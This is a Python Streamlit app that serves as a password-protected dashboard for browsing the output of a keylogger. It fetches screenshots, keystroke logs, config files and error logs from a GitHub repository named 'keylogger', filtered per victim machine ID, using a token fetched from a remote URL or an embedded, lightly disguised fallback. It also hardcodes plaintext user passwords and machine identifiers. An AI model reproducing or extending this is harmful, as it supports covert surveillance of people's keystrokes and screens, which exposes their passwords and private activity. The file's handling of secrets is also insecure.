
import streamlit as st
import requests
from datetime import datetime
import json
import hashlib
import time
from functools import lru_cache
from tenacity import retry, stop_after_attempt, wait_fixed
from streamlit import config as st_config


# URL containing the tokens JSON
TOKEN_URL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json"
# Default token if URL fetch fails
DEFAULT_TOKEN = "asdfg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aefthu"

def get_token():
    try:
        # Fetch the JSON from the URL
        response = requests.get(TOKEN_URL)
        if response.status_code == 200:
            token_data = response.json()

            # Check if the "delete" key exists
            if "delete" in token_data:
                token = token_data["delete"]

                # Remove the first 5 and last 6 characters
                processed_token = token[5:-6]
                return processed_token
            else:
                print("Key 'delete' not found in the token data.")
        else:
            print(f"Failed to fetch tokens. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while fetching the token: {e}")

    # Fallback to the default token
    print("Using default token.")
    return DEFAULT_TOKEN[5:-6]

# Call the function
GITHUB_TOKEN = get_token()

# User credentials (you can replace this with a database later)
USER_CREDENTIALS = {
    "bibekin": {
        "password": "bibekindata",
        "unique_id": "1BBDF0EE-FCAA-EC11-9269-8CB87EED61E1"
    },
    "bibeknp": {
        "password": "bibeknpdata",
        "unique_id": "4C4C4544-0033-3910-804A-B3C04F324233"
    },
    "devraj": {
        "password": "devrajdata",
        "unique_id": "FF:9B:C3:B8:53:25"
    }
}

# GitHub API details
GITHUB_API_URL_IMAGES = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/screenshots"
GITHUB_API_URL_LOGS = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/logs"
GITHUB_API_URL_CONFIG = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/config"
GITHUB_API_URL_KEYLOGERROR = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/keylogerror"

# Function to fetch files from GitHub
@st.cache_data(ttl=60, show_spinner="Loading data from GitHub...")
@retry(stop=stop_after_attempt(3), wait=wait_fixed(1))
def fetch_files_from_github(api_url):
    try:
        headers = {"Authorization": f"token {GITHUB_TOKEN}"}
        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            # Check rate limits
            remaining = int(response.headers.get("X-RateLimit-Remaining", 0))
            if remaining < 1000:
                st.warning(f"GitHub API rate limit low: {remaining} requests remaining")
            return response.json()
        else:
            st.error("Failed to fetch files from GitHub. Please check your API token.")
            return []
    except requests.exceptions.RequestException as e:
        st.error(f"Network error: {str(e)}")
        return []
    except json.JSONDecodeError:
        st.error("Invalid response from GitHub API")
        return []
    except KeyError:
        st.error("Unexpected data format from GitHub")
        return []

# Function to filter files for a specific user
def filter_files_for_user(files, unique_id):
    if files is None:  # Add null check
        return []
    filtered_files = [file for file in files if unique_id in file["name"]]
    return filtered_files

# Function to sort image files by timestamp
def sort_image_files_by_timestamp(files):
    # Filter only image files (assuming images have extensions like .png, .jpg, etc.)
    image_files = [file for file in files if file["name"].lower().endswith(('.png', '.jpg', '.jpeg'))]
    # Sort image files by timestamp extracted from the filename
    image_files.sort(key=lambda x: datetime.strptime(x["name"][:15], "%Y%m%d_%H%M%S"), reverse=True)
    return image_files

# Function to get file content from GitHub
# @st.cache_data  # Use @st.cache_data for caching
def get_file_content(file_url):
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    response = requests.get(file_url, headers=headers)
    if response.status_code == 200:
        return response.text
    else:
        st.error(f"Failed to fetch content for file: {file_url}")
        return ""

# Function to safely parse JSON content
def safe_parse_json(json_str):
    try:
        return json.loads(json_str)
    except json.JSONDecodeError as e:
        st.error(f"Failed to parse JSON content: {e}")
        return None

# Add new function
def log_user_activity(username, action):
    """Log user activities to a file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp} - User: {username} - Action: {action}\n"
    
    try:
        with open("user_activity.log", "a") as f:
            f.write(log_entry)
    except Exception as e:
        print(f"Failed to log activity: {e}")

# Add retry decorator to image loading
@retry(stop=stop_after_attempt(3), wait=wait_fixed(0.5))
def load_image_with_retry(url):
    response = requests.get(url, headers={"Authorization": f"token {GITHUB_TOKEN}"})
    response.raise_for_status()
    return response.content

# Streamlit app
def main():
#     st.set_page_config(page_title="User Dashboard", layout="wide", page_icon=":computer:")

    # Initialize session state
    if "logged_in" not in st.session_state:
        st.session_state.logged_in = False
        st.session_state.username = None
        st.session_state.unique_id = None
        st.session_state.files_images = None
        st.session_state.files_logs = None
        st.session_state.files_config = None
        st.session_state.files_keylogerror = None

    # Login Page
    if not st.session_state.logged_in:
        st_config.set_option("server.enableCORS", False)
        st_config.set_option("server.enableXsrfProtection", True)
        st.markdown("""<meta http-equiv="Content-Security-Policy" content="default-src 'self'">""", 
                  unsafe_allow_html=True)
        st.title("Login to your Dashboard")
        st.write("Please enter your credentials to access your dashboard.")
        st.subheader("Login")
        # Login form
        with st.form("login_form"):
            username = st.text_input("Username", max_chars=20).strip()
            password = st.text_input("Password", type="password", max_chars=50)
            if st.form_submit_button("Login"):
                # if username in USER_CREDENTIALS and USER_CREDENTIALS[username]["password"] == password:
                # Replace plain text password check with hashed version
                input_password_hash = hashlib.sha256(password.encode()).hexdigest()
                stored_password_hash = hashlib.sha256(USER_CREDENTIALS[username]["password"].encode()).hexdigest()
                if username in USER_CREDENTIALS and input_password_hash == stored_password_hash:
                    st.session_state.logged_in = True
                    st.session_state.username = username
                    st.session_state.unique_id = USER_CREDENTIALS[username]["unique_id"]
                    st.success("Login successful! Redirecting...")
                    log_user_activity(username, "Login")
                    st.success(f"Welcome, {username}!")
                    # Fetch files only once after login
                    st.session_state.files_images = fetch_files_from_github(GITHUB_API_URL_IMAGES)
                    st.session_state.files_logs = fetch_files_from_github(GITHUB_API_URL_LOGS)
                    st.session_state.files_config = fetch_files_from_github(GITHUB_API_URL_CONFIG)
                    st.session_state.files_keylogerror = fetch_files_from_github(GITHUB_API_URL_KEYLOGERROR)
                    # st.experimental_rerun()  # Refresh the app to show the dashboard
                else:
                    st.error("Invalid username or password.")

    # Dashboard Page
    else:
        st.toast("Processing your data...")
        st.warning("If you see your data not loading completely, Please consider clicking on **Refresh Data** button.")
        st.sidebar.warning("If you see your data not loading completely, Please consider clicking on **Refresh Data** button.")
        
        # Add session timeout check at the top
        SESSION_TIMEOUT = 1800  # 30 minutes
        last_activity = st.session_state.get('last_activity', time.time())
        if time.time() - last_activity > SESSION_TIMEOUT:
            st.warning("Session timed out due to inactivity.")
            st.session_state.logged_in = False
            st.rerun()
        st.session_state.last_activity = time.time()
        st.title(f"Dashboard for {st.session_state.username}")
        st.sidebar.title(f"Dashboard for {st.session_state.username}")
        
        # Add refresh button in sidebar
        if st.sidebar.button("Refresh Data"):
            log_user_activity(st.session_state.username, "Data Refresh")
            st.cache_data.clear()
            st.session_state.files_images = fetch_files_from_github(GITHUB_API_URL_IMAGES)
            st.session_state.files_logs = fetch_files_from_github(GITHUB_API_URL_LOGS)
            st.session_state.files_config = fetch_files_from_github(GITHUB_API_URL_CONFIG)
            st.session_state.files_keylogerror = fetch_files_from_github(GITHUB_API_URL_KEYLOGERROR)
            st.rerun()
        
        # logout button
        # Keep only one logout button
        if st.sidebar.button("Logout", key="unique_logout_button"):
            log_user_activity(st.session_state.username, "Logout")
            st.session_state.logged_in = False
            st.session_state.username = None
            st.session_state.unique_id = None
            st.session_state.files_images = None
            st.session_state.files_logs = None
            st.session_state.files_config = None
            st.session_state.files_keylogerror = None
        
        # Filter files for the logged-in user
        filtered_files_images = filter_files_for_user(st.session_state.files_images, st.session_state.unique_id)
        filtered_files_logs = filter_files_for_user(st.session_state.files_logs, st.session_state.unique_id)
        filtered_files_config = filter_files_for_user(st.session_state.files_config, st.session_state.unique_id)
        filtered_files_keylogerror = filter_files_for_user(st.session_state.files_keylogerror, st.session_state.unique_id)


        # Images display code
        with st.spinner("Processing Images..."):
            # Display images in a grid layout
            if filtered_files_images:
                st.header("Recent Screenshots:")
                show_images = st.sidebar.checkbox("Hide Recent Screenshots")  # Changed to "Hide" for clearer meaning
                if not show_images:  # Show images when checkbox is unchecked
                    # Sort image files by timestamp
                    sorted_images = sort_image_files_by_timestamp(filtered_files_images)
                    # Input box for the number of images to display
                    num_images = st.sidebar.number_input("Number of Images to Display", min_value=1, max_value=len(sorted_images), value=20)
                    # Limit the images to the specified number
                    limited_images = sorted_images[:num_images]

                    if limited_images:
                        st.write(f"Displaying {len(limited_images)} Images:")
                        cols_per_row = 5  # Number of images per row
                        for i in range(0, len(limited_images), cols_per_row):
                            row_files = limited_images[i:i + cols_per_row]
                            cols = st.columns(cols_per_row)
                            for col, file in zip(cols, row_files):
                                with col:
                                    try:
                                        # Convert GitHub URL to raw content URL
                                        # raw_url = file["html_url"].replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
                                        raw_url = file["download_url"]
                                        # Fetch image content
                                        try:
                                            img_content = load_image_with_retry(raw_url)
                                            st.image(img_content, caption=file["name"], use_container_width=True)
                                            # Add GitHub link and download button
                                            # st.markdown(f"[Open in GitHub]({file['html_url']})")
                                            st.download_button(
                                                label="Download",
                                                data=img_content,
                                                file_name=file["name"],
                                                mime="image/png",
                                                on_click=lambda: st.toast(f"Downloading {file['name']}...")
                                            )
                                        except Exception as e:
                                            st.error(f"Failed to load image after 3 attempts: {file['name']}")
                                    except Exception as e:
                                        st.error(f"Error loading imagee {file['name']}: {str(e)}")
                                        st.image("placeholder.jpg")  # Add a default error image
            else:
                st.info("No images found for this user.")
        st.write("---")  # Separator between images

        # Logs display code
        with st.spinner("Processing Logs..."):
            # Display logs
            if filtered_files_logs:
                st.header("Logs:")
                for file in filtered_files_logs:
                    with st.expander(f"**{file['name']}**: Show File Content"):
                        file_content = get_file_content(file["download_url"])
                        if file["name"].endswith(".txt"):
                            st.text_area("File Content", file_content, height=300, disabled=True)
                        elif file["name"].endswith(".json"):
                            st.text_area("File Content", file_content, height=300, disabled=True)
                        st.markdown(f"[Open File]({file['html_url']})")
                        # Download button for logs
                        st.download_button(label="Download File", data=file_content, file_name=file["name"], mime="text/plain")
        st.write("---")  # Separator between logs

        # Config files display code
        with st.spinner("Processing Config Files..."):
            # Display config files
            if filtered_files_config:
                st.header("Config Files:")
            for file in filtered_files_config:
                with st.expander(f"**{file['name']}**: Show File Content"):
                    file_content = get_file_content(file["download_url"])
                    if file["name"].endswith(".json"):
                        st.text_area("File Content", file_content, height=300, disabled=True)
                    st.markdown(f"[Open File]({file['html_url']})")
                    # Download button for config files
                    st.download_button(label="Download File", data=file_content, file_name=file["name"], mime="application/json")
        st.write("---")  # Separator between config files
                
        # Keylogerror files display code
        with st.spinner("Processing Keylogerror Files..."):
            if filtered_files_keylogerror:
                st.header("Keylog Error Files:")
                for file in filtered_files_keylogerror:
                    with st.expander(f"**{file['name']}**: Show File Content"):
                        file_content = get_file_content(file["download_url"])
                        if file["name"].endswith(".log"):
                            st.text_area("File Content", file_content, height=300, disabled=True)
                        st.markdown(f"[Open File]({file['html_url']})")
                        # Download button for keylogerror files
                        st.download_button(label="Download File", data=file_content, file_name=file["name"], mime="text/plain")
        st.write("---")  # Separator between config files
        
        # Add admin section in sidebar
        if st.session_state.username == "admin":
            with st.sidebar.expander("Admin Panel"):
                st.subheader("User Activity")
                try:
                    with open("user_activity.log", "r") as f:
                        st.download_button("Download Logs", f.read(), "activity.log")
                        st.text_area("Recent Activity", f.read()[-2000:], height=200)
                except FileNotFoundError:
                    st.warning("No activity log found")
                    
        
        st.sidebar.markdown("---")  # Add a separator
        # Add explanation tooltips throughout the UI
        with st.sidebar:
            st.markdown("ℹ️ **Help**")
            st.caption("Use the **Refresh Data** if data appears outdated")
        
        with st.sidebar.expander("What are these screenshots?"):
            st.write("These are automated screenshots captured in user defined interval...")
        
        with st.sidebar.expander("What are these logs?"):
            st.write("These are automated key logs captured in user defined interval...")
            
        with st.sidebar.expander("What are these config files?"):
            st.write("These are automated program configuration captured in user defined interval...")
            
        with st.sidebar.expander("What are these keylogerror files?"):
            st.write("These are automated keylogerror captured in user defined interval...")
            
        st.sidebar.markdown("---")  # Add a separator
        st.sidebar.write("© 2025 Bibek 💗. All rights reserved.")

# Run the app
if __name__ == "__main__":
    st.set_page_config(page_title="User Dashboard", layout="wide", page_icon=":computer:")
    with st.spinner("Loading dashboard..."):
        main()

# Custom footer
import datetime
current_year = datetime.datetime.now().year
st.markdown(f"""
    <footer style='text-align: center;'>
        © {current_year} Active User Dashboard | Developed by <a href='https://bibekchandsah.com.np' target='_blank' style='text-decoration: none; color: inherit;'>Bibek Chand Sah</a>
    </footer>
""", unsafe_allow_html=True)